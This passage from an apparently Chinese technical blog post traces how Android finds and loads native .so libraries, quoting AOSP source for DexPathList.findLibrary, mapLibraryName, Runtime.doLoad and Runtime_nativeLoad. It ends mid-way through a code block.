class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Provides a simple &#123;<span class="doctag">@link</span> ClassLoader&#125; implementation that operates on a list</span></span><br><span class="line"><span class="comment"> * of files and directories in the local file system, but does not attempt to</span></span><br><span class="line"><span class="comment"> * load classes from the network. Android uses this class for its system class</span></span><br><span class="line"><span class="comment"> * loader and for its application class loader(s).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PathClassLoader</span> <span class="keyword">extends</span> <span class="title">BaseDexClassLoader</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它们都属于BaseDexClassLoader的子类，也就是说双亲委派加载类时都会让BaseDexClassLoader尝试加载。</p><p>而我们的findLibrary，就属于BaseDexClassLoader的内部方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">findLibrary</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> pathList.findLibrary(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>这里的pathList又是什么呢？</strong></p><p>其实就是一个用于管理dex、resource、本地库路径的类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A pair of lists of entries, associated with a &#123;<span class="doctag">@code</span> ClassLoader&#125;.</span></span><br><span class="line"><span class="comment"> * One of the lists is a dex/resource path &amp;mdash; typically referred</span></span><br><span class="line"><span class="comment"> * to as a "class path" &amp;mdash; list, and the other names directories</span></span><br><span class="line"><span class="comment"> * containing native code libraries. Class path entries may be any of:</span></span><br><span class="line"><span class="comment"> * a &#123;<span class="doctag">@code</span> .jar&#125; or &#123;<span class="doctag">@code</span> .zip&#125; file containing an optional</span></span><br><span class="line"><span class="comment"> * top-level &#123;<span class="doctag">@code</span> classes.dex&#125; file as well as arbitrary resources,</span></span><br><span class="line"><span class="comment"> * or a plain &#123;<span class="doctag">@code</span> .dex&#125; file (with no possibility of associated</span></span><br><span class="line"><span class="comment"> * resources).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;This class also contains methods to use these lists to look up</span></span><br><span class="line"><span class="comment"> * classes and resources.&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*package*/</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">DexPathList</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEX_SUFFIX = <span class="string">".dex"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String zipSeparator = <span class="string">"!/"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** class definition context */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ClassLoader definingContext;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * List of dex/resource (class path) elements.</span></span><br><span class="line"><span class="comment">     * Should be called pathElements, but the Facebook app uses reflection</span></span><br><span class="line"><span class="comment">     * to modify 'dexElements' (http://b/7726934).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Element[] dexElements;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** List of native library path elements. */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Element[] nativeLibraryPathElements;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** List of application native library directories. */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;File&gt; nativeLibraryDirectories;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** List of system native library directories. */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;File&gt; systemNativeLibraryDirectories;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Exceptions thrown during creation of the dexElements list.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> IOException[] dexElementsSuppressedExceptions;</span><br><span class="line"></span><br><span class="line">    ........</span><br><span class="line">    ........</span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Element of the dex/resource file path</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">/*package*/</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Element</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> File dir;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> isDirectory;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> File zip;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> DexFile dexFile;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> ZipFile zipFile;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">boolean</span> initialized;</span><br><span class="line">      ....</span><br><span class="line">     ....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以说，如果我们要查找一个so的路径，就需要从dexPathList中查阅。</p><p>它的查找逻辑为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Finds the named native code library on any of the library</span></span><br><span class="line"><span class="comment"> * directories pointed at by this instance. This will find the</span></span><br><span class="line"><span class="comment"> * one in the earliest listed directory, ignoring any that are not</span></span><br><span class="line"><span class="comment"> * readable regular files.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the complete path to the library or &#123;<span class="doctag">@code</span> null&#125; if no</span></span><br><span class="line"><span class="comment"> * library was found</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">findLibrary</span><span class="params">(String libraryName)</span> </span>&#123;</span><br><span class="line">    String fileName = System.mapLibraryName(libraryName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Element element : nativeLibraryPathElements) &#123;</span><br><span class="line">        String path = element.findNativeLibrary(fileName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (path != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> path;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>1、首先，拼接so的全称，也就是上面的System.mapLibraryName</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns the platform specific file name format for the shared library</span></span><br><span class="line"><span class="comment"> * named by the argument. On Android, this would turn &#123;<span class="doctag">@code</span> "MyLibrary"&#125; into</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@code</span> "libMyLibrary.so"&#125;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">mapLibraryName</span><span class="params">(String nickname)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nickname == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException(<span class="string">"nickname == null"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"lib"</span> + nickname + <span class="string">".so"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2、然后在本地的库路径中查找目标so，如果命中，则返回全路径</strong>。</p><p>这里的nativeLibraryPathElements是在构造函数中初始化的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">DexPathList</span><span class="params">(ClassLoader definingContext, String dexPath,</span></span></span><br><span class="line"><span class="function"><span class="params">          String libraryPath, File optimizedDirectory)</span> </span>&#123;</span><br><span class="line">   </span><br><span class="line">   ....</span><br><span class="line">     ....</span><br><span class="line">      <span class="comment">// Native libraries may exist in both the system and</span></span><br><span class="line">      <span class="comment">// application library paths, and we use this search order:</span></span><br><span class="line">      <span class="comment">//</span></span><br><span class="line">      <span class="comment">//   1. This class loader's library path for application libraries (libraryPath):</span></span><br><span class="line">      <span class="comment">//   1.1. Native library directories</span></span><br><span class="line">      <span class="comment">//   1.2. Path to libraries in apk-files</span></span><br><span class="line">      <span class="comment">//   2. The VM's library path from the system property for system libraries</span></span><br><span class="line">      <span class="comment">//      also known as java.library.path</span></span><br><span class="line">      <span class="comment">//</span></span><br><span class="line">      <span class="comment">// This order was reversed prior to Gingerbread; see http://b/2933456.</span></span><br><span class="line">       </span><br><span class="line">      <span class="comment">// 两个路径，一个是当前应用的库路径，一个是系统的库路径。</span></span><br><span class="line">      <span class="comment">// add的方式加入list中，当前应用的库路径position先于系统的</span></span><br><span class="line">      <span class="keyword">this</span>.nativeLibraryDirectories = splitPaths(libraryPath, <span class="keyword">false</span>);</span><br><span class="line">      <span class="keyword">this</span>.systemNativeLibraryDirectories =</span><br><span class="line">              splitPaths(System.getProperty(<span class="string">"java.library.path"</span>), <span class="keyword">true</span>);</span><br><span class="line">      List&lt;File&gt; allNativeLibraryDirectories = <span class="keyword">new</span> ArrayList&lt;&gt;(nativeLibraryDirectories);</span><br><span class="line">      allNativeLibraryDirectories.addAll(systemNativeLibraryDirectories);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">this</span>.nativeLibraryPathElements = makePathElements(allNativeLibraryDirectories, <span class="keyword">null</span>,</span><br><span class="line">                                                        suppressedExceptions);</span><br><span class="line">......</span><br><span class="line">        .....</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>对于so来说，它可能存在于系统的库路径下，亦可能存在于当前应用的库路径下。</p><p>所以对于so的搜索查找来说，它的顺序为：</p><ul><li>现在当前应用的库路径下查找</li><li>如果没有，再到系统的库路径下查找</li></ul><p>在我们拼装完当前so的全称后，就会遍历nativeLibraryPathElements这个List，它里面包含的也就是应用的库路径和系统的库路径（应用的库路径position在系统的库路径前面）。</p><p>接下来，就返回到了RunTime.getRunTime().loadLibrary()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">String filename = loader.findLibrary(libraryName);</span><br><span class="line"><span class="keyword">if</span> (filename == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="comment">// It's not necessarily true that the ClassLoader used</span></span><br><span class="line">    <span class="comment">// System.mapLibraryName, but the default setup does, and it's</span></span><br><span class="line">    <span class="comment">// misleading to say we didn't find "libMyLibrary.so" when we</span></span><br><span class="line">    <span class="comment">// actually searched for "liblibMyLibrary.so.so".</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> UnsatisfiedLinkError(loader + <span class="string">" couldn't find \""</span> +</span><br><span class="line">                                   System.mapLibraryName(libraryName) + <span class="string">"\""</span>);</span><br><span class="line">&#125;</span><br><span class="line">String error = doLoad(filename, loader);</span><br><span class="line"><span class="keyword">if</span> (error != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> UnsatisfiedLinkError(error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><p>这里的filename也就是查找库后的全路径。</p><p>接着就会调用doLoad将这个so加载到内存当中。</p><h2 id="LD-LIBRARY-PATH"><a href="#LD-LIBRARY-PATH" class="headerlink" title="LD_LIBRARY_PATH"></a>LD_LIBRARY_PATH</h2><p>进行下一步分析之前，需要了解一下LD_LIBRARY_PATH。</p><p>这个字段是Linux的环境变量名，主要用于指定查找共享库（动态链接库）时除了默认路径之外的其他路径。</p><p>因为Android的应用进程都fork自zygote，这也就意味着所有的应用进程都不能拥有自定义的LD_LIBRARY_PATH。也就是说一个APP的共享库路径不在LD_LIBRARY_PATH上。</p><p>对于PathClassloader来说，它本来就是用于查找本地文件系统下的资源和dex，所以它能获取目标库而不需要任何依赖。但对于一个拥有多个相互依赖的库的APP来说，load就必须遵从most-dependent-first的顺序。</p><p>所以Android的动态链接器增加了一套API，用于更新当前运行的进程的库路径。它会获取当前ClassLoader加载的库路径，在调用nativeLoad时将这个路径传入。</p><h2 id="doLoad"><a href="#doLoad" class="headerlink" title="doLoad"></a>doLoad</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">doLoad</span><span class="params">(String name, ClassLoader loader)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Android apps are forked from the zygote, so they can't have a custom LD_LIBRARY_PATH,</span></span><br><span class="line">    <span class="comment">// which means that by default an app's shared library directory isn't on LD_LIBRARY_PATH.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// The PathClassLoader set up by frameworks/base knows the appropriate path, so we can load</span></span><br><span class="line">    <span class="comment">// libraries with no dependencies just fine, but an app that has multiple libraries that</span></span><br><span class="line">    <span class="comment">// depend on each other needed to load them in most-dependent-first order.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// We added API to Android's dynamic linker so we can update the library path used for</span></span><br><span class="line">    <span class="comment">// the currently-running process. We pull the desired path out of the ClassLoader here</span></span><br><span class="line">    <span class="comment">// and pass it to nativeLoad so that it can call the private dynamic linker API.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// We didn't just change frameworks/base to update the LD_LIBRARY_PATH once at the</span></span><br><span class="line">    <span class="comment">// beginning because multiple apks can run in the same process and third party code can</span></span><br><span class="line">    <span class="comment">// use its own BaseDexClassLoader.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// We didn't just add a dlopen_with_custom_LD_LIBRARY_PATH call because we wanted any</span></span><br><span class="line">    <span class="comment">// dlopen(3) calls made from a .so's JNI_OnLoad to work too.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// So, find out what the native library search path is for the ClassLoader in question...</span></span><br><span class="line">    String ldLibraryPath = <span class="keyword">null</span>;</span><br><span class="line">    String dexPath = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (loader == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// We use the given library path for the boot class loader. This is the path</span></span><br><span class="line">        <span class="comment">// also used in loadLibraryName if loader is null.</span></span><br><span class="line">        ldLibraryPath = System.getProperty(<span class="string">"java.library.path"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (loader <span class="keyword">instanceof</span> BaseDexClassLoader) &#123;</span><br><span class="line">        BaseDexClassLoader dexClassLoader = (BaseDexClassLoader) loader;</span><br><span class="line">        ldLibraryPath = dexClassLoader.getLdLibraryPath();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// nativeLoad should be synchronized so there's only one LD_LIBRARY_PATH in use regardless</span></span><br><span class="line">    <span class="comment">// of how many ClassLoaders are in the system, but dalvik doesn't support synchronized</span></span><br><span class="line">    <span class="comment">// internal natives.</span></span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> nativeLoad(name, loader, ldLibraryPath);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以看到，如果classloader为空，ldLibraryPath就指定为本地文件库的路径。</p><p><strong>在BaseDexClassLoader中，获取ldLibraryPath的方法为：</strong></p><p>遍历pathList，拿到当前应用下的库路径（不是系统的）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@hide</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getLdLibraryPath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    StringBuilder result = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span> (File directory : pathList.getNativeLibraryDirectories()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (result.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            result.append(<span class="string">':'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        result.append(directory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="nativeLoad"><a href="#nativeLoad" class="headerlink" title="nativeLoad"></a>nativeLoad</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> jstring <span class="title">Runtime_nativeLoad</span><span class="params">(JNIEnv* env, jclass, jstring javaFilename, jobject javaLoader,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  jstring javaLdLibraryPathJstr)</span> </span>&#123;</span><br><span class="line">  <span class="function">ScopedUtfChars <span class="title">filename</span><span class="params">(env, javaFilename)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (filename.c_str() == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SetLdLibraryPath(env, javaLdLibraryPathJstr);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> error_msg;</span><br><span class="line">  &#123;</span><br><span class="line">    JavaVMExt* vm = Runtime::Current()-&gt;GetJavaVM();</span><br><span class="line">    <span class="keyword">bool</span> success = vm-&gt;LoadNativeLibrary(env, filename.c_str(), javaLoader, &amp;error_msg);</span><br><span class="line">    <span class="keyword">if</span> (success) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Don't let a pending exception from JNI_OnLoad cause a CheckJNI issue with NewStringUTF.</span></span><br><span class="line">  env-&gt;ExceptionClear();</span><br><span class="line">  <span class="keyword">return</span> env-&gt;NewStringUTF(error_msg.c_str());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ScopedUtfChars</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  ScopedUtfChars(JNIEnv* env, jstring s) : env_(env), string_(s) &#123;</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      utf_chars_ = <span class="literal">NULL</span>;</span><br><span class="line">      jniThrowNullPointerException(env, <span class="literal">NULL</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      utf_chars_ = env-&gt;GetStringUTFChars(s, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ~ScopedUtfChars() &#123;</span><br><span class="line">    <span class="keyword">if</span> (utf_chars_) &#123;</span><br><span class="line">      env_-&gt;ReleaseStringUTFChars(string_, utf_chars_);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">c_str</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> utf_chars_;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> size() <span class="keyword">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strlen</span>(utf_chars_);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>&amp; <span class="keyword">operator</span>[](<span class="keyword">size_t</span> n) <span class="keyword">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> utf_chars_[n];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  JNIEnv* <span class="keyword">const</span> env_;</span><br><span class="line">  <span class="keyword">const</span> jstring string_;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>* utf_chars_;</span><br><span class="line"></span><br><span class="line">  DISALLOW_COPY_AND_ASSIGN(ScopedUtfChars);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里主要做的内容为将上方传入的libtest.so转为jni下的String类型，设置LdLibraryPath，拿到VM对象，告诉虚拟机加载目标库文件LoadNativeLibrary。</p><p><strong>虚拟机加载库的逻辑为：</strong></p><ul><li>判断是否已经加载过该so，如果已经加载，直接返回</li><li>如果没有，则使用dlopen打开目标库。只要目标库的引用计数不为0，那么就不会调用dlclose</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span 